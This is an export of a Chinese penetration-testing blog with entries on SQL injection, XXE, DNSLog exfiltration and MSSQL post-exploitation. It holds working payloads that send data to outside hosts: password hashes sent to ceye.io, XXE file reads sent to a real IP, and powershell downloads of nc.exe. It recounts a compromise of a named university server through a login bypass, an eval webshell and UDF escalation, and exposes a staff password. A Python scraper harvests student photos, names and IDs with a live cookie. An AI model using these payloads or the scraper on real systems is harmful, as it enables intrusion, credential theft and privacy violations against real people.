    <content type="text"><![CDATA[tips: where条件语句后不允许指定数据库名or表名 以及一个找后台的小技巧 注入表名： 注入列名： 失败。 失败的原因可能是’被转义了，之前遇到过，ok 换16进制代替 失败。 猜测是URL超长 排除URL超长的可能 猜测是information_schema这个库中的columns表名改了于是测试： 还是失败。 注入当前数据库的表名用数据库名称 代替database()函数 失败 猜测 where后面只能用函数，不能跟字符，用char()来编码数据 OK 继续注入爆列名 找后台 1.御剑扫了一圈什么都没看到 2.百度 inurl:xxxx 发现只有3个页面被收录了，没后台 3.awvs带有爬虫功能，爬了一下没看见后台，倒是看到了.htaccess 123456&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]&lt;/IfModule&gt; 百度发现这是TP框架的htaccess 所以有可能后台入口是http://TargetURL/index.php/admin 再仔细看下URL：index.php?s=/Guide/index/id/30 构造index.php?s=/admin/跳转到后台]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>char函数编码数据</tag>
        <tag>mysql注入</tag>
        <tag>tp框架找后台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML实体注入漏洞总结(XXE)]]></title>
    <url>%2FXML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-XXE.html</url>
    <content type="text"><![CDATA[XML实体注入漏洞的总结。 xml基础知识http://www.w3school.com.cn/xml/index.asp DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。DTD声明始终以!DOCTYPE开头,空一格后跟着文档根元素的名称。 DTD声明： 实体定义： %name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 外部实体支持的类型 xml实体注入产生原理xml实体注入是DTD引用外部实体导致的漏洞 检测漏洞判断xml能否解析123&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY name "my name is nMask"&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt; 判断是否支持外部调用123&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY name SYSTEM "http://47.95.206.199/index.html"&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt; 读取任意文件有回显状态下123&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE x[&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;]&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt; 在网站的正常发送的xml前面加上一个DTD实体的声明，然后在某个标签内调用。 无回显的状态下12345678&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=d:/tony.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://47.95.206.199/1.xml"&gt;%dtd;%send;]&gt;&lt;root&gt;&lt;/root&gt; 1.xml的内容为： 1&lt;!ENTITY % payload "&lt;!ENTITY % send SYSTEM 'http://47.95.206.199/xxe.php?file=%file;'&gt;"&gt; %payload; PS:配合dnslog会更好用 payload和上面一样。 1&lt;!ENTITY % payload "&lt;!ENTITY % send SYSTEM 'http://%file;.t00ls.3e426ecf5c48221e002db4ae061cc4bc.tu4.org'&gt;"&gt; %payload; 执行命令12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "expect://whoami" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 要求PHP支持expect拓展，好像默认是没开的。 内网探测探测内网服务器端口12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 攻击内网机器12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/payload" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; XXE的防御方法使用开发语言提供的禁用外部实体的方法PHP： libxml_disable_entity_loader(true); JAVA: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>XML实体注入</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>XML实体注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWVS扫描结果中一些常见的高危漏洞总结-长期更新]]></title>
    <url>%2FAWVS%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0.html</url>
    <content type="text"><![CDATA[记录一些高危漏洞，以后再遇见就不用百度找了 Blind SQL Injection盲注，包括基于时间的盲注和基于布尔盲注 基于时间的盲注总结 基于布尔的盲注总结附脚本 Malware detected被Google标记为危险站点的。 SQL injectionsql注入，有时候会误报，也包含xml实体注入 xml实体注入 SVN repository foundsvn源代码泄露 直接访问http://targetURL/.svn/format or 用seay的源代码泄露工具 或者 https://github.com/admintony/svnExploit svn &gt; 1.7 时，请用笔者的工具 SFTP/FTP credentials exposureSFTP or FTP配置文件泄露 （类似gitlab） Sublime text3 连接sftp/ftp（远程服务器） Microsoft IIS 6.0 WebDAV Buffer OverflowIIS6.0 远程代码执行漏洞 很多利用工具 Unicode transformation issues [xss绕过]wvs的Unicode transformation issues的问题 Vulnerabilities in SharePoint could allow elevation of privilegeWebLogic Server Side Request ForgeryWebLogic SSRF 及漏洞修复 Apache 2.2.14 mod_isapi Dangling PointerCVE-2010-0425 EXP Microsoft IIS tilde directory enumerationiis的端文件名漏洞 XML external entity injectionXML实体注入漏洞总结(XXE) XML实体注入漏洞 XXE漏洞攻防 Session fixation什么Session fixation Long password denial of service由于未对密码长度进行过滤，导致对过长的密码加密时，过多的消耗服务器的资源。 Configuration file source code disclosure配置文件代码泄露 index.php~ 由vim产生的备份文件 Directory traversal目录遍历 WEB-INF Drupal Core 6.xDrupal漏洞 Vulnerabilities in SharePoint could allow elevation of privilegeXSS Java Debug Wire Protocol Remote Code Executionhttps://github.com/IOActive/jdwp-shellifier]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透工具</category>
        <category>AWVS</category>
      </categories>
      <tags>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于布尔盲注的脚本编写实例]]></title>
    <url>%2F%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B.html</url>
    <content type="text"><![CDATA[一个基于布尔盲注的脚本编写实例 前置知识判断user长度-1 OR if((length(user())=14),1,0) 查user()-1 OR if(ascii(substr(user(),1,1))=114,1,0) 查database()-1 OR if(ascii(substr(database(),1,1))=114,1,0) 查version()-1 OR if(ascii(substr(database(),1,1))=114,1,0) 查表的数量-1 or (select count(table_name) from information_schema.tables where table_schema=database())&gt;0; 查表名的长度-1 or (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0 查表名-1 or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=97; 查列名的长度-1 or (select length(column_name) from information_schema.columns where table_name=table_name limit 0,1)&gt;0 查列名-1 or ascii(substr((select column_name from information_schema.columns where table_name=table_name limit 0,1),1,1))=97; 布尔盲注工具代码地址布尔盲注工具 使用方法1&gt;第一处 1234#Target URLurl = "http://targetURL//index.php?a=index&amp;f=ilist&amp;p="#keyword 用于判断页面是否正确keyword ="keyword" 将代码开头的URL和keyword修改,这里要注意一下，建议存在注入的参数别写值，payload会自动补全 2&gt;第二处：需要使用什么功能就把什么功能的代码注释取消即可，至于该改的table_name,column_name自己改一下 1234567891011121314info = Info()#注入当前数据库的用户#info.user()#注入数据库的版本#info.version()#注入当前数据库的名字#info.database()#注入表名#run()#注入列名run_column("shi_user")#注入数据#columnL = ["uid","pwd"]#run_value("pw_user",*columnL) 3&gt;爆列中数据的时候，列名请填写两个，在程序写死了，如果需要多个列名请修改第334行代码： e.g.三个列 12payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" \% (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>MySQL布尔盲注脚本</category>
      </categories>
      <tags>
        <tag>MySQL布尔盲注</tag>
        <tag>布尔盲注脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL基于时间的盲注总结]]></title>
    <url>%2FMYSQL%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[今天遇到一个站点是基于时间的盲注，有防护软件，sqlmap还没连上就被拦截了(还在拦截中)，只好手工搞了，但是又不太会盲注，因此学习总结一下。(后面附脚本) 前置基础知识MYSQL的if函数使用格式：IF(Condition,A,B) 含义：如果Condition成立，则A，否则B MYSQL的substr函数的使用格式：SUBSTR(string,start,len) 含义：从string的start位开始截取len个字符 MYSQL的ascii函数的使用格式：ASCII(char) 含义：将char转化成ascii码 盲注思路基于时间盲柱 1if(ascii(substr(查询语句,start,1))=97,sleep(3),1) 基于布尔盲注 1or ascii(substr(查询语句,start,1))=97 substr函数中可以接select语句 两种类型盲注的区别 基于布尔盲注是根据页面差异判断是否存在注入，以及数据注入的 基于时间盲注是通过盲注不能得到差异页面(比如：无论输入什么都显示同一个页面.)， 这时候可以尝试时间盲注 补充： 为什么没有差异，有这么几种情况： 第一种情况：无论输入什么都只显示无信息页面，例如登陆页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况下也不知道。在这种情况下，有可能基于时间的SQL注入会有效。 第二种情况：无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面。采集用户的 IP、浏览器类型、refer字段、session字段，无论用户输入什么，都显示正常页面。 第三种情况：差异页面不是由输入URL中的SQL语句来决定的。这种情况下，也只能使用基于时间的盲注。 注入-判断注入今天看到awvs里面判断盲注的payload感觉很使用，也很经典，这里就搬过来。 payload: if(now()=sysdate(),sleep(6),0)/*&apos;XOR(if(now()=sysdate(),sleep(6),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ 这里看到，查看这个页面一共用了4秒，所以存在注入 tips: 第一点：awvs是用了几次这个语句，改变sleep的时间，来说明存在注入的；第二点：有的页面显示有非法请求，但是这种很有可能已经把sql语句带入数据库执行了(今晚就是这个情况) 注入-查看信息查看用户名payload：if(ascii(substr(user(),第几位,1))=114,sleep(3),1) 查看数据库payload：if(ascii(substr(database(),1,1))=114,sleep(5),1) 查看mysql的版本payload：if(ascii(substr(database(),1,1))=114,sleep(5),1) 注入-爆表、列、查信息爆表1union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1 那么问题来了，盲注能用order by吗？怎么去判断有多少个字段 答案：待测，没有盲注环境，目标站点已经限制我的访问，不过我倒是有个妙计。 union select if(ascii(substr(user(),1,1))=114,sleep(5),1),2,3 因为我们不需要知道字段的多少就可以猜解出user了，可以让if恒为真，然后去添加字段个数，如果请求有延时，就说明字段个数正确，否则说明字段个数错误。下面的图是我再mysql命令行中测试的。 足以说明原理 爆列名1union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = 'admin' limit 0,1 爆数据1union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1 python写盲注脚本设计思路&lt;1&gt; 时间判断 start = time.time() end = time.time() all = end-start &lt;2&gt; 将所有代表字符的ascii码整理进一个list，对list进行迭代 &lt;3&gt; 返回数据的时候用char(ascci码)转化成明文数据]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>MySQL盲注</category>
      </categories>
      <tags>
        <tag>MySQL盲注</tag>
        <tag>基于时间盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过学工越权爬学生的照片]]></title>
    <url>%2F%E9%80%9A%E8%BF%87%E5%AD%A6%E5%B7%A5%E8%B6%8A%E6%9D%83%E7%88%AC%E5%AD%A6%E7%94%9F%E7%9A%84%E7%85%A7%E7%89%87.html</url>
    <content type="text"><![CDATA[本校学工越权漏洞，里面很多档案，可以看到照片，可以爬行一波，主要是练习写Python代码. 先放图再放代码 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127__author__="AdminTony"import re,requests,sysfrom multiprocessing import Queueimport threadingcookies = "yunsuo_session_verify=86daa89c0c25c8803351495a2b8d95d8; DropDownListYx_xsbh=DropDownListYx_xsbh=; DropDownListXsfl=DropDownListXsfl=; cjlr_Xq=cjlr_Xq=25; cjlr_Bjid=cjlr_Bjid=; _ga=GA1.3.1080839298.1512715498; ASP.NET_SessionId=udbfif5nbhlmsmqfeuu3gtvg; CenterSoftheader = &#123;"cookie":cookies, "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"&#125;#正则模块class Re_all(object): def __init__(self,content): self.content = content #匹配id def re_id(self): #Student_Edit.aspx?Status=Edit&amp;Id=45734 r_id = re.compile("&lt;a href=\"Student_Edit.aspx\?Status=Edit&amp;Id=(.*?)\"&gt;") idlist = r_id.findall(self.content) return idlist #匹配照片的url def re_image(self): re_image = re.compile(r'&lt;img id="Student11_Image1" src="\.\.(.*?)"') temp = re_image.findall(self.content) image_url="http://xsc.swust.edu.cn/Sys/SystemForm"+temp[0] return image_url def re_ids(self): #&lt;input name="Student11$StudentNo" type="text" id="Student11_StudentNo" maxlength="25" style="width: 145px" disabled="disabled" value="5120170703"&gt; re_id = re.compile(r'&lt;input name="Student11\$StudentNo" type="text" id="Student11_StudentNo" maxlength="25" style="width: 145px" disabled="disabled" value="(\d*?)"') id = re_id.findall(self.content) return id[0] def re_name(self): re_name=re.compile(r'&lt;input name="Student11\$StudentName" type="text" id="Student11_StudentName" maxlength="25" style="width: 139px" value="(.*?)"') name = re_name.findall(self.content) #print(self.content) return name[0]#获取照片的urldef getimage(id): url = "http://xsc.swust.edu.cn/Sys/SystemForm/Class/Student_Edit.aspx?Status=Edit&amp;Id="+id res_ = requests.get(url,headers=header) re_all = Re_all(res_.text) #图片链接，姓名，学号 image_url = re_all.re_image() print("[+] 获取URL：",image_url) name = re_all.re_name() ids = re_all.re_ids() re_nophoto = re.compile(r"nophoto") if re_nophoto.search(image_url): print("[-] 没有照片 %s %s" % (ids, name)) else: # 下载图片 print("[+] 正在下载图片 %s %s" % (name, ids)) res = requests.get(image_url, headers=header) with open("./image/%s%s.jpg" % (ids, name), "wb") as file: file.write(res.content)#获取iddef getid(): print("[+] 正在获取IDlist") data=&#123;"__VIEWSTATEENCRYPTED":"","TPaged1$Jump":"%CC%F8++%D7%AA"&#125; data['__VIEWSTATE']='' url = "http://xsc.swust.edu.cn/Sys/SystemForm/Class/Student.aspx" res = requests.get(url,headers=header) i=1 list = [] while(i&lt;=680): sys.stdout.write(' ' * 30 + '\r') sys.stdout.write("获取进度 %s/680"%i) sys.stdout.flush() i+=1 r = Re_all(res.text) list += r.re_id() data['TPaged1$GotoPage']=i res = requests.post(url,data=data,headers=header) #print(res.text) print("") print("[+] 获取IDlist完毕！") return list#thread启动的方法def image_thread(id_list): for id in id_list: getimage(id) #print("[+] 获取URL："+imageurl)def main(): idlist = getid() print("[+] 获取到",len(idlist),"条ID.") image_list=[] thread_num = 20 #分配每一个线程扫描的数量 if len(idlist)%thread_num == 0: tmp = len(idlist)/thread_num tmp = int(tmp) #余数 temp = 0 else: tmp = (len(idlist)-(len(idlist)%thread_num))/thread_num tmp = int(tmp) #余数 temp = len(idlist)%thread_num #起始st 结束 end st=0 end = 0 for i in range(thread_num): if i==0: st = 0 end = st+tmp-1 elif(i&lt;=thread_num-2): st = end +1 end = st +tmp-1 else: #将余数 分配给最后一组 st = end+1 end = st+tmp-1+temp id_list=[] #分配资源 for i in range(st,end): id_list.append(idlist[i]) #启动线程 thread = threading.Thread(target=image_thread,args=(id_list,)) thread.start() thread.join()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>爬照片</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某OA越权导致服务器沦陷(已联系修复)]]></title>
    <url>%2F%E6%9F%90OA%E8%B6%8A%E6%9D%83%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B2%A6%E9%99%B7-%E5%B7%B2%E8%81%94%E7%B3%BB%E4%BF%AE%E5%A4%8D.html</url>
    <content type="text"><![CDATA[俗话说:黑不了自己学校的黑客不是好黑客。这次我也像大多数黑客那样，黑了自己的母校，并且漏洞已经报送给学校修复后才写的文章。 信息收集前期信息收集很重要，收集到的信息(下面要用到的)如下： 工号：9920110059 密码：123456asdf # 这个账号密码是统一认证平台的 丁艺,id:1020130039，国防科技学院 毛光灿，1020030085，计算机科学与技术学院 OA的越权漏洞 登陆oa的方式有三种：注册用户，猜测用户的账号密码，和统一认证平台身份登陆 1.注册用户需要管理员审核，行不通 2.前期信息收集到的工号密码不能登陆oa 显示密码错误 3.收集到的工号密码可以登陆统一认证平台，但是没权限访问oa，如图 该用户被设置禁止访问oa的，但是注意URL： http://oa.swust.edu.cn/logincheck_pt.php?USERNAME=9920110059 看到了一个地方USERNAME=工号，大胆猜测这里应该有越权，用前面收集到的工号试试 噗嗤，可以直接绕过，在教师的oa里面找了一圈也没看到可以利用的点。 那这就结束了吗？ 当然不是！ 既然这里要的是USERNAME，我们只要找到管理员的用户名就可以登陆管理员的用户了吧 管理员的用户名怎么找：猜呗！ http://oa.swust.edu.cn/logincheck_pt.php?USERNAME=admin 可能我运气好，直接猜中username=admin登陆了后台 GETSHELL进了后台先收集一波信息：OA服务器信息 物理路径 PHP&amp;MYSQL信息 部分开放的端口 GETSHELL的要点 这里有个数据库用户管理，可以添加用户，添加一个用户，然后navicat链接 去mysql数据库看了一下，我创建的用户的权限和root用户的权限是一样的，但是都没有file权限 12UPDATE user set File_priv ='Y';flush privileges; 这样就有了权限了，但是还不能导出文件，secure_file_priv也没有限制导出文件，用另外一个方法 1set global general_log=on;set global general_log_file='路径/t.php';select '&lt;?php eval($_POST[t]) ?&gt;'; 菜刀链接测试： 提权有很高的MYSQL数据库权限，就选择UDF提权吧。 mysql的pulgin路径：D:\MYOA\mysql5\lib\plugin\ 但是不能导出dll，那只能在本地将dll导出，然后上传上去 创建函数： 1create function shell returns string soname 't.dll'; 函数已经创建是我之前创建过了，执行命令查看权限： 1select shell('cmd','whoami'); 后面的截图没了，很顺利的进入了服务器，也没什么可以写的.]]></content>
      <categories>
        <category>渗透测试</category>
        <category>GETSHELL</category>
        <category>MySQL写shell</category>
      </categories>
      <tags>
        <tag>越权</tag>
        <tag>提权</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSSQL手工注入总结]]></title>
    <url>%2FMSSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[之前搞mssql数据库的注入都是直接跑工具，但是总是有些注入点工具一扫就崩，关键时候还是要手工注入，因此总结学习mssql手工注入，写此文留作笔记。本次主要总结显错注入！ payload： 1?Id=admin' and 1=convert(int,(sql语句)) AND 'CvNI'='CvNI 基本信息获取数据库信息获取12345671=convert(int,(db_name())) #获取当前数据库名1=convert(int,(@@version)) #获取数据库版本1=convert(int,(select quotename(name) from master..sysdatabases FOR XML PATH(''))) #一次性获取全部数据库1=convert(int,(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))) #一次性获取全部数据库 USER信息1234567and 1=(select IS_SRVROLEMEMBER('db_owner')) #查看是否为db_owner权限、sysadmin、public （未测试成功）如果正确则正常，否则报错1=convert(int,(user)) #查看连接数据库的用户admin' AND 1878=CONVERT(INT,(SELECT SUBSTRING((CASE WHEN(IS_SRVROLEMEMBER('db_owner')=1)THEN '1' ELSE '0' END),1,100))) AND 'iaQQ'='iaQQ #来自sqlmap 也为测试成功。ps:未测试成功坑能是环境问题 获取表名获取所有表名11=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('V_XG_BZKS_SHSJHD','HH_HeartHealthRefer_Web'))) #将报出来的表名填入 table_name not in的元组 获取指定数据库的表名123451=convert(int,(select top 1 quotename(name) from [数据库名]..sysobjects where name not in('table_name1','table_name2') and xtype='U') #逐条获取表名，将报出来的表名放入tuple1=convert(int,(select quotename(name) from [数据库名]..sysobjects where xtype='U' FOR XML PATH(''))) #一次性获取表名，如果表很多的话会失败。1=convert(int,(select top 1 table_name from information_schema.tables where table_catalog=[数据库名] and table_name not in('V_XG_BZKS_SHSJHD','HH_HeartHealthRefer_Web'))) #将报出来的表名填入 table_name not in的元组 获取列名获取注入点的表中的列名12having 1=1 --group by column_name1,column_name2 having 1=1-- 获取任意表中的列名11=convert(int,(select quotename(name) from [数据库名]..syscolumns where id =(select id from [数据库名]..sysobjects where name='table_name') FOR XML PATH(''))) #一次性列出该表所有的列名，列名比较少，建议用这个 爆数据1=(select top 1 * from [数据库名]..[表名] FOR XML PATH(‘’)) 参考文献MSSQL注入 SQL手工注入基础详解—-MSSQL篇 Sql Server 手工注入总结（显错模式） （转-收集）MSSQL手工注入语句集合]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>MSSQL手工注入</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>MSSQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSSQL的DBA注入的一些小操作]]></title>
    <url>%2FMSSQL%E7%9A%84DBA%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[搞了一晚上的mssql的dba注入，虽然没搞下来，但是收获颇深，总结一下小技巧 查看当前目录echo %CD% #C:/Windows/system32 常用的下载文件方法certutilcertutil -urlcache -split -f https://www.baidu.com/img/bd_logo1.png D:\x.txt 自定义目录下载 powershell1powershell (new-object System.Net.WebClient).DownloadFile( 'http://47.95.206.199/NC.EXE','c:\Users\mssql$centersoft\desktop\nc.exe') ftp123456echo open 127.0.0.1 21&gt; c:\Users\mssql$centersoft\desktop\ftp1.txtecho xadmintony&gt;&gt; c:\Users\mssql$centersoft\desktop\ftp1.txtecho y123456&gt;&gt; c:\Users\mssql$centersoft\desktop\ftp1.txtecho lcd c:\Users\mssql$centersoft\desktop\&gt;&gt;c:\Users\mssql$centersoft\desktop\ftp1.txtecho GET nc.exe&gt;&gt;c:\Users\mssql$centersoft\desktop\ftp1.txtecho bye&gt;&gt;c:\Users\mssql$centersoft\desktop\ftp1.txt 其他方法移步： https://www.t00ls.net/articles-37253.html 不写那么多了，其他的有点鸡肋 查看文件内容more c:\a.txt 查找文件1234dir \s \b xxx #在执行cmd的盘符查找(好像可以从内容中找)dir c:\ \s \b xxx #在c盘查找dir c:\ #显示c盘的内容dir \s\b c:xxx.aspx #查找文件 win自带的压缩解压命令12345压缩一个文件： makecab c:/file_name.txt c:/file_name.zip 解压一个文件： expand c:/file_name.zip c:/file_name.txt ps:必须用makcab压缩的才能用expand解压]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>MSSQL高权限注入</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DBA注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNSLog在渗透中的使用]]></title>
    <url>%2FDNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[这是一个DNS查询的过程图，我就直接搬过来了。 DNSLOG是什么？ 我的理解比较通俗：记录DNS访问记录的东西，举例解释(这里用的是t00ls的dnslog) 访问： 1admintony.x.t00ls.3e426ecf5c48221e002db4ae061cc4bc.tu4.org 然后查看记录 DNSLOG在渗透中的用法DNSLOG在盲注中的用法MTSQL数据库利用条件： 1.有file权限的数据库用户 2.且开启allow_url_fopen(默认开启) 3.secure_file_priv= 利用payload： 1http://127.0.0.1/fuzz/?id=1 and if((select load_file(concat(0x7c,(select database()),'.t00ls.3e426ecf5c48221e002db4ae061cc4bc.tu4.org'))),1,1) 很鸡肋，我本地测试没成功，找了一个注入点测试也没成功，但是也有成功的案例，某春秋上面也有失败的案例。 SQL Server1234567DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name='sa')+'.ip.port.b182oj.ceye.io';EXEC('master..xp_dirtree"\\'+@host+'\foobar$"'); Oracle12345SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL; PostgreSQL123456789101112131415DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');exec_cmd := E'COPY table_output(content)FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';EXECUTE exec_cmd;END;$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); 命令执行linux下：12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182oj.ceye.io Win下：1ping %USERNAME%.b182oj.ceye.io 1234567891011121314151617181920212223242526272829303132变量 类型 描述%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。%CD% 本地 返回当前目录字符串。%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。%COMPUTERNAME% 系统 返回计算机的名称。%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。%PATH% 系统 指定可执行文件的搜索路径。%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。%PROCESSOR_IDENTFIER% 系统 返回处理器说明。%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。%PROCESSOR_REVISION% 系统 返回处理器的版本号。%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。%TEMP%和%TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。%USERDOMAIN% 本地 返回包含用户帐户的域的名称。%USERNAME% 本地 返回当前登录的用户的名称。%USERPROFILE% 本地 返回当前用户的配置文件的位置。%WINDIR% 系统 